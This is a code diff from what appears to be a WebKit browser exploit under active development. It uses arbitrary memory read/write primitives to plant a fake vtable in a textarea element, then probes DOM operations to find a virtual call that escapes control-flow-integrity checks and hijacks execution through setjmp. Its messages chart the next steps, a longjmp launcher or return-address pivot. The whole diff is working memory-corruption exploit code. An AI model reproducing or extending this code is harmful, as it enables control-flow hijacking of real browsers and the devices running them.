@@ -275,24 +275,40 @@ async function prepare(p) {
             return { wkOk, stackOk, rip, rsp };
         }
 
+        // Preserve the impl object's first 0x48 bytes; setjmp overwrites them
+        // (rdi = impl), so we restore between trials to keep the textarea usable.
+        const implSave = [];
+        for (let i = 0; i < 9; i++) implSave.push(p.read8(impl.add32(i * 8)));
+        function restoreImpl() {
+            for (let i = 0; i < 9; i++) p.write8(impl.add32(i * 8), implSave[i]);
+        }
+
+        // Simpler property reads first (least likely to reach a CFI-guarded
+        // polymorphic dispatch); heavier DOM ops last. Whichever op leaves a
+        // jmp_buf in impl used an UNGUARDED virtual call -- that is the vector.
         const trials = [
-            ["focus",   () => textArea.focus()],
-            ["blur",    () => textArea.blur()],
-            ["click",   () => textArea.click()],
+            ["nodeName",  () => { void textArea.nodeName; }],
+            ["localName", () => { void textArea.localName; }],
+            ["tagName",   () => { void textArea.tagName; }],
+            ["value",     () => { void textArea.value; }],
+            ["type",      () => { void textArea.type; }],
+            ["toString",  () => { void textArea.toString(); }],
             ["scrollTop", () => { void textArea.scrollTop; }],
-            ["select",  () => textArea.select()],
-            ["nodeName", () => { void textArea.nodeName; }],
-            ["toString", () => { void textArea.toString(); }],
-            ["remove",  () => textArea.remove()]
+            ["focus",     () => textArea.focus()],
+            ["blur",      () => textArea.blur()],
+            ["select",    () => textArea.select()],
+            ["click",     () => textArea.click()]
         ];
 
         let winner = null;
         for (const [name, op] of trials) {
-            // (re)install the fake vtable pointer, then fire the op.
+            // FVT-TRY is committed to the screen BEFORE the op. If the op
+            // performs a CFI-GUARDED virtual call through our out-of-range fake
+            // vtable, it traps (ud2 -> SIGILL) and the process dies here -- so
+            // an FVT-TRY with no following FVT-RESULT names the guarded op.
             p.write8(impl, fakeVtable);
             jbmark("FVT-TRY", "op=" + name + "-impl=0x" + impl.toString()
-                + "-fakevt=0x" + fakeVtable.toString()
-                + "-setjmp=0x" + SETJMP.toString());
+                + "-fakevt=0x" + fakeVtable.toString());
             let threw = "";
             try { op(); } catch (e) { threw = String(e && e.message).slice(0, 60); }
             const r = looksLikeJmpBuf();
@@ -301,9 +317,7 @@ async function prepare(p) {
                 + "-rsp=0x" + r.rsp.toString() + "-stackOk=" + r.stackOk
                 + (threw ? "-threw=" + threw : ""));
             if (r.wkOk && r.stackOk) { winner = { name, rip: r.rip, rsp: r.rsp }; break; }
-            // restore the real vtable before the next trial so the textarea is
-            // usable again (setjmp may have clobbered impl[0]).
-            p.write8(impl, realVtable);
+            restoreImpl();
         }
 
         if (winner) {
@@ -314,9 +328,12 @@ async function prepare(p) {
             throw new Error("bootstrap milestone: fake-vtable virtual call CONFIRMED via '"
                 + winner.name + "'. Next step: wire the longjmp launcher.");
         }
-        p.write8(impl, realVtable);
+        restoreImpl();
+        jbmark("FVT-DONE", "no-op-produced-a-clean-virtual-call"
+            + "-all-either-noop-or-CFI-guarded");
         throw new Error("bootstrap milestone: no trial produced a controllable "
-            + "virtual call. Widen the trials list or reconsider the vector.");
+            + "virtual call (all no-op or CFI-guarded). Pivot to a CFI-immune "
+            + "primitive (jmp_buf / return-address).");
     }
 
     async function wait_for_worker() {
